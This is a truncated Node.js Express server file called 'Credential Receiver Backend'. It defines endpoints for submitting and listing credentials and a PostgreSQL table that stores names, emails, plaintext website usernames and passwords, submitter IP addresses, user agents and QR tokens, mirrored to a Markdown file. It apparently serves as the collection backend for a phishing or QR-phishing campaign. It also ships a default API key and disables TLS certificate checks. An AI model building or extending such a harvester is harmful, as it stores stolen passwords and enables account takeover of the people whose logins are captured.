/**
 * Credential Receiver Backend — Express.js (PostgreSQL)
 * ======================================================
 * Receives credential submissions via REST API, saves them
 * to a PostgreSQL database, and maintains a synchronized
 * structured Markdown file with full metadata.
 *
 * Endpoints:
 *   POST   /api/credentials     — Submit credentials (requires API Key)
 *   GET    /api/credentials     — List all saved entries (requires API Key)
 *   GET    /api/credentials/:id — Get a single entry by ID (requires API Key)
 *   DELETE /api/credentials/:id — Delete an entry and rebuild MD (requires API Key)
 *   GET    /api/health          — Health check
 *
 * Usage:
 *   npm install
 *   npm start
 */

require("dotenv").config({ path: require("path").resolve(__dirname, ".env") });
const express = require("express");
const cors = require("cors");
const helmet = require("helmet");
const morgan = require("morgan");
const fs = require("fs");
const path = require("path");
const { v4: uuidv4 } = require("uuid");
const { Pool } = require("pg");

// Diagnostics to track if and why the server exits
process.on("exit", (code) => {
  console.log(`[PROCESS EXIT] Node process exited with code: ${code}`);
});
process.on("uncaughtException", (err) => {
  console.error("[UNCAUGHT EXCEPTION] Critical error:", err);
});
process.on("unhandledRejection", (reason, promise) => {
  console.error("[UNHANDLED REJECTION] Unhandled promise rejection at:", promise, "reason:", reason);
});

// ============================================================================
// CONFIG
// ============================================================================

const PORT = process.env.PORT || 3000;
const MD_FILE = path.join(__dirname, "credentials.md");
const API_KEY = process.env.API_KEY || "change-me-secret"; // simple auth header

if (!process.env.DATABASE_URL) {
  console.error("CRITICAL ERROR: DATABASE_URL environment variable is not defined.");
  process.exit(1);
}

// ============================================================================
// DATABASE SETUP
// ============================================================================

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: {
    rejectUnauthorized: false, // Standard for cloud database connections like Neon
  },
});

/** Initialize the table schema if it does not exist */
async function initDb() {
  const createTableQuery = `
    CREATE TABLE IF NOT EXISTS credentials (
      id UUID PRIMARY KEY,
      name VARCHAR(255) NOT NULL,
      email VARCHAR(255) NOT NULL,
      website_user VARCHAR(255) NOT NULL,
      website_pass VARCHAR(255) NOT NULL,
      ip VARCHAR(255) NOT NULL,
      user_agent TEXT NOT NULL,
      timestamp VARCHAR(255) NOT NULL,
      iso VARCHAR(255) NOT NULL,
      source VARCHAR(255) NOT NULL
    );
  `;
  try {
    await pool.query(createTableQuery);
    await pool.query("ALTER TABLE credentials ADD COLUMN IF NOT EXISTS dialogue TEXT;");
    await pool.query("ALTER TABLE credentials ADD COLUMN IF NOT EXISTS qr_token VARCHAR(255);");
    await pool.query("UPDATE credentials SET qr_token = id::text WHERE qr_token IS NULL OR qr_token LIKE 'mailto%';");
    console.log("Database table initialized and migrated successfully.");
  } catch (err) {
    console.error("Failed to initialize database table:", err);
    process.exit(1);
  }
}

